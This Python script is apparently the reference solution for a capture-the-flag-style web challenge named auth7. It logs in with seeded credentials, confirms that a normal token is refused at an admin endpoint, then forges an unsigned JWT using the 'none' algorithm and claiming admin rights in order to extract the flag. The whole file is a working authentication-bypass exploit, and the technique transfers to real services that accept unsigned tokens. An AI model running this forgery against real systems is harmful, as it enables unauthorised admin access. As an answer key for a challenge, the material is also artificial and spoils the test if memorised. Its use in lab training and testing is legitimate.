#!/usr/bin/env python3
"""Reference exploit for auth7 (ConnectAPI Partner Gateway).

Logs in as the seeded non-admin partner to confirm a legitimate token is
rejected by /partner/admin, then crafts an "alg": "none" token claiming
partner=admin and presents it instead -- no signature, no secret needed.
"""
import base64
import json
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8066")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    r = s.post(f"{BASE}/login", data={"partner": "acme", "secret": "acmepass"}, timeout=5)
    m = re.search(r"<code[^>]*>([\w.\-]+)</code>", r.text)
    if not m:
        sys.stderr.write("login did not return a token\n")
        return 1
    legit_token = m.group(1)

    # Pre-exploit: the legitimately-issued, non-admin token must NOT reach the flag.
    r = s.get(f"{BASE}/partner/admin", timeout=5,
              headers={"Authorization": f"Bearer {legit_token}"})
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: legit token already admin\n")
        return 1

    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64url(json.dumps({"partner": "admin"}, separators=(",", ":")).encode())
    forged = f"{header}.{payload}."

    r = s.get(f"{BASE}/partner/admin", timeout=5, headers={"Authorization": f"Bearer {forged}"})
    m2 = re.search(r"flag\{[^}]+\}", r.text)
    if m2:
        print(m2.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
